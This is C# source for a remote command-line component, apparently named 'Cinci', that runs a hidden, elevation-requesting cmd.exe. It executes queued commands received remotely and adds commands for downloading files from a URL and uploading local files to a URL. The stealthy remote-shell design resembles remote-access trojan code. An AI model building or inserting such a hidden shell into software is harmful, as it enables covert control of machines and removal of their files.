using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Threading;

namespace RemoteCLI
{
    class CommandPrompt
    {
        private MainForm gui;
        private ProcessStartInfo cmdStartInfo;
        private Process cmdProcess;
        private List<String> commands;
        private Boolean lockOutput;
        private String tempOutput;
        public CommandPrompt(MainForm form)
        {
            gui = form;
            Initialize();
        }
        private void Initialize()
        {
            try
            {
                cmdStartInfo = new ProcessStartInfo("cmd")
                {
                    WindowStyle = ProcessWindowStyle.Hidden,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    RedirectStandardInput = true,
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    Verb = "runas"
                };
                commands = new List<String>();
                lockOutput = false;
                tempOutput = "";
            }
            catch (Exception ex)
            {
                print_error(ex);
            }
        }
        public ThreadStart run_CMD()
        {
            cmdProcess = new Process();
            try
            {
                cmdProcess.StartInfo = cmdStartInfo;
                cmdProcess.ErrorDataReceived += cmd_output;
                cmdProcess.OutputDataReceived += cmd_output;
                cmdProcess.EnableRaisingEvents = true;
                cmdProcess.Start();
                cmdProcess.BeginOutputReadLine();
                cmdProcess.BeginErrorReadLine();
                execute();
            }
            catch (Exception ex)
            {
                print_error(ex);
            }
            return null;
        }
        private void execute()
        {
            try
            {
                while (commands.Count > 0)
                {
                    // Execute FIFO
                    string cmd = commands[0];
                    if (cmd.Contains("cinc-dw"))
                    {
                        lockOutput = true;
                        cmdProcess.StandardInput.WriteLine("cd");
                        while (lockOutput) { } // Wait until the output is updated from the other thread
                        string url = cmd.Remove(0, cmd.IndexOf(' ') + 1);
                        string path = tempOutput.Substring(0, tempOutput.IndexOf('>')).Replace(@"\", @"\\");
                        CincDW cincDW = new CincDW();
                        string result = cincDW.downloadFile(url, path);
                        cmd_output(result);
                    }
                    else if (cmd.Contains("cinc-up"))
                    {
                        lockOutput = true;
                        cmdProcess.StandardInput.WriteLine("cd");
                        while (lockOutput) { } // Wait until the output is updated from the other thread
                        string filePath = tempOutput.Remove(tempOutput.IndexOf('>')).Replace(@"\", @"\\");
                        string[] tokens = cmd.Split(' ');
                        string fileName = tokens[1];
                        string url = tokens[2];
                        CincUP cincUP = new CincUP();
                        string result = cincUP.uploadFile(url, filePath + "\\" + fileName);
                        cmd_output(result);
                    }
                    else if (cmd == "exit")
                    {
                        stop_CMD();
                    }
                    else
                    {
                        cmdProcess.StandardInput.WriteLine(cmd);
                    }
                    commands.Remove(cmd);
                    tempOutput = "";
                    lockOutput = false;
                }
            }
            catch (Exception ex)
            {
                print_error(ex);
            }
        }
        public void exec_command(string command)
        {
            commands.Add(command);
            execute();
        }
        public void stop_CMD()
        {
            try
            {
                cmdProcess.StandardInput.WriteLine("exit"); // STOP
                cmdProcess.WaitForExit();
                cmd_output(">>>Cinci: Command Prompt is stopped!");
            }
            catch (Exception ex)
            {
                print_error(ex);
            }
        }
        private void cmd_output(object sender, DataReceivedEventArgs e)
        {
            if (!lockOutput)
            {
                cmd_output(e.Data);
            }
            tempOutput = e.Data;
            lockOutput = false;
        }
        private void cmd_output(string output)
        {
            try
            {
                gui.BeginInvoke((Action)delegate
                {
                    gui.return_remote_result(output + "\r\n");
                }
                );
            }
            catch (Exception) {}
        }

        private void print_error(Exception ex)
        {
            cmd_output(">>>Cinci: Command ERROR!\r\n");
            cmd_output(">>>" + ex.Message);
        }
    }
}
